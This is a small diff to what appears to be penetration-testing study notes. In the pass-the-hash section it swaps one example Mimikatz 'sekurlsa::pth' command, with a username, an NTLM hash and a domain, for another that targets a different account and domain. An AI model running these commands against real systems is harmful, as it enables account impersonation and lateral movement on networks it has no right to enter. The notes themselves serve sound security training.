@@ -36,8 +36,7 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /
 # 2. After that, we can use cmd.exe to execute commands in the user's context. 
 
 # Example:
-# .\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
-
+# .\mimikatz.exe privilege::debug "sekurlsa::pth /user:iis_service /rc4:6436AA0BC6AAEBFFC79CD5760C260CE6 /domain:relia.com /run:cmd.exe" exit
 ```
 
 ## Pass the Hash with SMBclient
